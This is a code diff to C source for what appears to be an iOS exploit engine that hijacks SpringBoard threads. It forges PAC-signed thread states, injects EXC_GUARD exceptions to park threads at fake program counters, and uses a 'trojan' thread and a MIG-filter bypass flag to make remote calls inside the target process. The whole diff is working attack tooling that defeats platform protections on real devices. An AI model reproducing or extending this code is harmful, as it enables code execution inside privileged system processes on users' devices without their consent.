@@ -406,11 +406,9 @@ const char *remote_call_last_init_failure_detail(void)
             // thread is about to run at did not produce a signature. This is the pacia
             // signer's own wait, inside remote_pac, and it is counted.
             case 4:  step = "sign_state failed (pacia signer returned nothing)"; break;
-            // Both waits completed and the step was never set, which is the only way to
-            // land here now: the call went out, ran, trapped on the way back, and the
-            // engine has nothing left to complain about. Reaching the failure branch at
-            // all in that state is a bug in whatever tested the return, not in the
-            // engine, so the sentence says so rather than inventing a cause.
+            // Both waits completed but wait2 PC was not FAKE_LR - a fault inside the
+            // callee. Marked so bootstrap cannot treat it as a green light.
+            case 5:  step = "wait2 fault (PC was not FAKE_LR 0x201)"; break;
             default: step = "both waits completed (no step recorded)"; break;
         }
         snprintf(detail, sizeof(detail), "attempts=%d last=%s pacTimeouts=%d pid=%llu",
@@ -1419,14 +1417,74 @@ static bool tro_swap_thread_op(uint64_t targetThread,
 // this engine has no primitive for that: remote_write is the aliasing path the file
 // distrusts, and a remote memcpy needs a target source. Until there is one, the honest
 // thing is for this to say no in one line instead of succeeding and costing a round.
+// Park a target thread at FAKE_PC/LR without a usable SB-side mach port right
+// in this task. Same mechanism as the creator trap: inject EXC_GUARD, catch on
+// the already-installed secondExceptionPort, reply a signed park state.
+//
+// The old TRO-swap path ran thread_set_state inside SpringBoard with a state
+// buffer allocated here — that address is unmapped in SB, so set_state wrote
+// nothing while reporting success (e268f92: "parked" then stable/getpid hang,
+// SB EXC_BAD_ACCESS at the hijacked SP). Do not bring that back.
+static bool park_remote_thread_via_exc_guard(uint64_t targetThread,
+                                             const arm_thread_state64_internal *stateToInstall,
+                                             bool useMigFilterBypass)
+{
+    (void)useMigFilterBypass;
+    if (!is_kaddr_valid(targetThread) || !stateToInstall) {
+        RC_DIAG("EXC_GUARD park: bad args thread=0x%llx state=%p",
+                (unsigned long long)targetThread, stateToInstall);
+        return false;
+    }
+    if (!MACH_PORT_VALID(g_RC_secondExceptionPort)) {
+        RC_DIAG("EXC_GUARD park: secondExceptionPort invalid");
+        return false;
+    }
+
+    mach_exception_code_t guardCode = 0;
+    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
+    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
+    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);
+
+    if (!inject_guard_exception(targetThread, guardCode)) {
+        RC_DIAG("EXC_GUARD park: inject failed thread=0x%llx",
+                (unsigned long long)targetThread);
+        return false;
+    }
+    RC_DIAG("EXC_GUARD park: injected on 0x%llx — waiting secondExceptionPort",
+            (unsigned long long)targetThread);
+
+    ExceptionMessage exc;
+    int timeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0
+                  ? g_RC_stableExceptionTimeoutFloorMS : 10000;
+    if (!wait_exception(g_RC_secondExceptionPort, &exc, timeoutMS, false)) {
+        RC_DIAG("EXC_GUARD park: wait MISS timeout=%d — clearing guard", timeoutMS);
+        clear_guard_exception(targetThread);
+        return false;
+    }
+    clear_guard_exception(targetThread);
+
+    // Keep the trapped thread's own SP/FP/flags. Only PC/LR come from the
+    // pre-signed park state. Copying hijacked-main SP onto thread[1] is the
+    // 2026-09-26 IPS (set_state kr=0, getpid with sp=0).
+    arm_thread_state64_internal park = exc.threadState;
+    park.__pc = stateToInstall->__pc;
+    park.__lr = stateToInstall->__lr;
+    RC_DIAG("EXC_GUARD park: trap SP=0x%llx FP=0x%llx install PC=0x%llx LR=0x%llx",
+            (unsigned long long)native_strip(park.__sp),
+            (unsigned long long)native_strip(park.__fp),
+            (unsigned long long)native_strip(park.__pc),
+            (unsigned long long)native_strip(park.__lr));
+
+    reply_with_state(&exc, &park);
+    RC_DIAG("EXC_GUARD park: reply sent — thread should sit at 0x301");
+    return true;
+}
+
 static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
                                             const arm_thread_state64_internal *stateToInstall,
                                             bool useMigFilterBypass)
 {
-    (void)targetThread; (void)stateToInstall; (void)useMigFilterBypass;
-    RC_DIAG("TRO park: refused — thread_set_state runs in the target but the state "
-            "buffer is allocated here, so it installs nothing while reporting success");
-    return true;
+    return park_remote_thread_via_exc_guard(targetThread, stateToInstall, useMigFilterBypass);
 }
 
 static bool park_remote_thread_via_tro_swap_unused(uint64_t targetThread,
@@ -1734,7 +1792,14 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
         // Callers that treat a non-zero x0 as success then feed that garbage
         // onward — outBuf=0x10 into pthread_create is the recorded case. Mark
         // the call failed so those checks cannot pass.
+        //
+        // Also set the step. Bootstrap used to treat step==0 as "both waits
+        // completed, mechanism OK" and force g_RC_success back to true. A fault
+        // leaves step at 0 (neither wait timed out), so that restore turned a
+        // measured getpid fault into a green light and walked into create.
         g_RC_success = false;
+        if (g_RC_lastTempStep == 0)
+            g_RC_lastTempStep = 5;
         arm_thread_state64_internal park = exc2.threadState;
         if (sign_state(g_RC_trojanThreadAddr, &park,
                        FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR)) {
@@ -2996,18 +3061,22 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         // the pacia signer was never late, and the call went out and came back with
         // zero. Every part of the engine was working, and the session was destroyed
         // over a return value that is thrown away.
-        if (g_RC_lastTempStep == 0) {
-            // Restored because the transport clears it for the reason above, and
-            // every step after this one is guarded on it: the pthread create reads
-            // "g_RC_success && createResult == 0", so leaving it false here would skip
-            // the synthetic call thread and the session would limp on without one.
+        // Mechanism OK = both waits completed AND the second was a real return
+        // to FAKE_LR 0x201. step==0 alone is not enough: a fault inside the
+        // callee also completes both waits and used to leave step at 0, so the
+        // restore below painted over g_RC_success=false and the session walked
+        // on (e268f92 log: getpid faulted at getpid+0x18, then "done success=1").
+        if (g_RC_lastTempStep == 0 && g_RC_success &&
+            native_strip(g_RC_lastTempRetPC) == FAKE_LR_TROJAN_CREATOR) {
             g_RC_success = true;
             break;
         }
     }
-    RC_DIAG("bootstrap getpid done pid=%llu success=%d step=%d",
-            (unsigned long long)bootstrapPid, (int)g_RC_success, g_RC_lastTempStep);
-    if (g_RC_lastTempStep != 0) {
+    RC_DIAG("bootstrap getpid done pid=%llu success=%d step=%d retPC=0x%llx",
+            (unsigned long long)bootstrapPid, (int)g_RC_success, g_RC_lastTempStep,
+            (unsigned long long)native_strip(g_RC_lastTempRetPC));
+    if (g_RC_lastTempStep != 0 || !g_RC_success ||
+        native_strip(g_RC_lastTempRetPC) != FAKE_LR_TROJAN_CREATOR) {
         RC_DIAG("bootstrap getpid FAILED");
         fail_after_creator_park(RemoteCallInitFailureBootstrapGetpid, targetPid);
         return -1;
@@ -3028,30 +3097,15 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     g_RC_callThreadPath = "";
 
     if (!ios26StubPthread) {
-        // The start routine is a real function, not a fake address.
-        //
-        // It was a signature over 0x301, on the theory that the kernel records the
-        // start program counter as creation-time state and that the thread faults
-        // there the moment it is released, which is the whole of the park. The
-        // thread is never released until its state has been written from the outside
-        // anyway, see the park below, so nothing runs the start routine, so making it
-        // a fake address buys nothing and costs the one input the create cannot
-        // cope with being wrong.
-        //
-        // The cost is measured. A create that faulted reported it as a return, and
-        // x0 at the fault was 0x10, which is not a pointer and not an argument this
-        // call was given: the thread was already looping on a fault by then, which
-        // is what the transport did with a faulted state, now fixed separately.
-        //
-        // A real, stripped, shared cache function is what this file records as
-        // working on a pre-26 target: "On pre-26, suspended_np + stripped
-        // shared-cache getpid works (756f683)". That is the one line of this call
-        // that has a measurement behind it, so it is the one that goes back to it.
-        uint64_t startRoutine = native_strip((uint64_t)dlsym(RTLD_DEFAULT, "getpid"));
-        const char *startKind = "stripped_getpid";
-        if (!startRoutine || startRoutine == (uint64_t)-1) {
+        // Fl0rk: start = remote_pac(trojan, 0x301, 0). Creation-time PC is the
+        // park trap. Suspended_np does not run start until resume; create-success
+        // parks via set_state first. Stripped getpid still faulted create here
+        // with out=SP-0x100 already correct (e268f92).
+        uint64_t startRoutine = remoteCrashSigned;
+        const char *startKind = "signed_0x301";
+        if (!startRoutine) {
             g_RC_callThreadStep = 12;
-            RC_DIAG("no start routine address — cannot create call thread");
+            RC_DIAG("no start routine signature — cannot create call thread");
             fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
             return -1;
         }
@@ -3337,64 +3391,35 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         //
         // A live SpringBoard thread has a real stack pointer, a real frame pointer and
         // real flags, and reading them is the only way to keep all three.
+        // EXC_GUARD park keeps the trapped thread's own SP/FP/flags and only
+        // installs signed PC/LR from this buffer. Sign with trojanThreadAddr -
+        // same as the stable reply path (signing with callThreadAddr produced
+        // uncatchable RET->0x401 SIGBUS). Do not copy g_RC_originalState SP here;
+        // that was the hijacked-sp crash.
         arm_thread_state64_internal park = {0};
-        bool haveOwn = false;
-        if (callThreadPort && thread_get_state_wrapper(callThreadPort, &park)) {
-            haveOwn = true;
-        } else {
-            park = (arm_thread_state64_internal){0};
-            park.__sp = g_RC_originalState.__sp;
-            park.__fp = g_RC_originalState.__fp;
-            park.__flags = g_RC_originalState.__flags;
-            RC_DIAG("TRO-swap park: no own state (port=0x%llx), falling back to the "
-                    "hijacked thread's stack", (unsigned long long)callThreadPort);
-        }
-        // This signs for the REUSED thread, and the reply path in
-        // do_remote_call_stable_addr_internal deliberately does the opposite, with a
-        // note that it was measured:
-        //
-        //   "Cyanide/Fl0rk: ALWAYS sign with trojanThreadAddr (PAC gadget context),
-        //    even though the exception arrives on the synthetic call thread.
-        //    Signing with callThreadAddr produced uncatchable RET->0x401 SIGBUS."
-        //
-        // That is a real experiment against this choice and it is not being dismissed.
-        // The two are different mechanisms and that is the only reason both can stand:
-        // a reply delivers a state to a thread that is already stopped, and a
-        // thread_set_state installs one, and the key that authenticates a program
-        // counter when the thread runs it is the thread's own either way. If this
-        // park faults the reused thread at the moment it is released, with
-        // EXC_BAD_ACCESS.execute or EXC_BAD_INSTRUCTION and a program counter at
-        // 0x301, then the note above is about this path too and the sign has to go
-        // back to g_RC_trojanThreadAddr. That is a one-line change and it is recorded
-        // here rather than left for the next reader to discover from a crash.
-        if (!sign_state(g_RC_callThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN)) {
-            // thread_set_state is what actually parks the target thread on this path,
-            // so a failed sign here means the park never happens and the thread is
-            // left running the target's own code. Stop rather than set_state it with
-            // an unsigned PC.
-            RC_DIAG("TRO-swap park: sign_state failed, not parking thread[1]");
+        park.__flags = g_RC_originalState.__flags;
+        if (!sign_state(g_RC_trojanThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN)) {
+            RC_DIAG("EXC_GUARD park: sign_state failed, not parking thread[1]");
             g_RC_callThreadStep = 15;
-            g_RC_callThreadPath = haveOwn ? "reuse1-sign-failed-own" : "reuse1-sign-failed";
+            g_RC_callThreadPath = "reuse1-sign-failed";
             g_RC_success = false;
             return -1;
         }
-        RC_DIAG("TRO-swap park thread[1]=0x%llx pc=0x%llx lr=0x%llx sp=0x%llx own=%d",
+        RC_DIAG("EXC_GUARD park thread[1]=0x%llx signedPC=0x%llx signedLR=0x%llx",
                 (unsigned long long)g_RC_callThreadAddr,
                 (unsigned long long)park.__pc,
-                (unsigned long long)park.__lr,
-                (unsigned long long)park.__sp,
-                (int)haveOwn);
-        RC_DIAG("TRO-swap park begin (no join; fail restores main)");
-        g_RC_callThreadPath = haveOwn ? "reuse1" : "reuse1-hijacked-sp";
+                (unsigned long long)park.__lr);
+        RC_DIAG("EXC_GUARD park begin (fail restores main)");
+        g_RC_callThreadPath = "reuse1-exc-guard";
         if (!park_remote_thread_via_tro_swap(g_RC_callThreadAddr, &park,
                                              useMigFilterBypass)) {
-            RC_DIAG("TRO-swap park failed — restoring main @0x201");
+            RC_DIAG("EXC_GUARD park failed — restoring main @0x201");
             g_RC_callThreadStep = 16;
             fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
             return -1;
         }
-        parkedViaGuard = true; // reused flag: parked without SB port
-        RC_DIAG("parked thread[1] at 0x301 via TRO-swap set_state (no port)");
+        parkedViaGuard = true;
+        RC_DIAG("parked thread[1] at 0x301 via EXC_GUARD + reply_with_state");
     }
     (void)parkedViaGuard;
 
